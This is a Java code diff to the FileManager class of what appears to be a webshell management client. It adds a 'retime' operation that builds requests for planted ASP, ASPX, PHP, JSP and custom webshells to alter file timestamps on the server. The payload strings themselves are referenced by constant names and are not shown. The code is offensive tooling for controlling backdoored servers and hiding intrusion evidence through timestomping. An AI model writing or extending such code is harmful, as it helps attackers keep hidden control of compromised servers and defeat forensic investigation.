@@ -185,6 +185,9 @@ public class FileManager {
 			case "rename":
 				params = Safe.PASS+"="+Safe.ASP_MAKE.replace("PAYLOAD", Safe.ASP_RENAME)+"&"+Safe.PARAM1+"="+this.makeParam2(path)+"&"+Safe.PARAM2+"="+this.makeParam2(data);
 				break;
+			case "retime":
+				params = Safe.PASS+"="+Safe.ASP_MAKE.replace("PAYLOAD", Safe.ASP_RETIME)+"&"+Safe.PARAM1+"="+this.makeParam2(path)+"&"+Safe.PARAM2+"="+this.makeParam2(data);
+				break;
 			case "upload":
 				params = Safe.PASS+"="+Safe.ASP_MAKE.replace("PAYLOAD", Safe.ASP_UPLOAD)+"&"+Safe.PARAM1+"="+toHexString(path)+"&"+Safe.PARAM2+"="+this.makeParam2(data)+"&z3=0";	
 				int l = 0;
@@ -257,6 +260,9 @@ public class FileManager {
 				break;
 			case "rename":
 				params = Safe.PASS+"="+Safe.ASPX_RENAME+"&"+Safe.PARAM1+"="+this.makeParam1(path)+"&"+Safe.PARAM2+"="+this.makeParam1(data);
+				break;
+			case "retime":
+				params = Safe.PASS+"="+Safe.ASPX_RETIME+"&"+Safe.PARAM1+"="+this.makeParam1(path)+"&"+Safe.PARAM2+"="+this.makeParam1(data);
 				break;
 			case "upload":
 				String param3=null;
@@ -331,6 +337,10 @@ public class FileManager {
 				params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_RENAME,
 						this.makeParam1(path), this.makeParam2(data));
 				break;
+			case "retime":
+				params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_RETIME,
+						this.makeParam1(path), this.makeParam2(data));
+				break;
 			case "newdict":
 				params = Common.makeParams(Safe.PHP_MAKE, Safe.PHP_NEWDICT,
 						this.makeParam1(path));
@@ -362,6 +372,9 @@ public class FileManager {
 			case "rename":
 				params = Common.makeParams(Safe.JSP_MAKE, Safe.JSP_RENAME,this.makeParam1(path),this.makeParam2(data))+"&"+Safe.CODE+"="+this.code;
 				break;
+			case "retime":
+				params = Common.makeParams(Safe.JSP_MAKE, Safe.JSP_RETIME,this.makeParam1(path),this.makeParam2(data))+"&"+Safe.CODE+"="+this.code;
+				break;
 			case "newdict":
 				params = Common.makeParams(Safe.JSP_MAKE, Safe.JSP_NEWDICT,this.makeParam1(path))+"&"+Safe.CODE+"="+this.code;
 				break;
@@ -390,6 +403,9 @@ public class FileManager {
 				break;
 			case "rename":
 				params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_RENAME,this.makeParam1(path),this.makeParam2(data));
+				break;
+			case "retime":
+				params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_RETIME,this.makeParam1(path),this.makeParam2(data));
 				break;
 			case "newdict":
 				params = Common.makeParams(Safe.CUS_MAKE, Safe.CUS_NEWDICT,this.makeParam1(path));
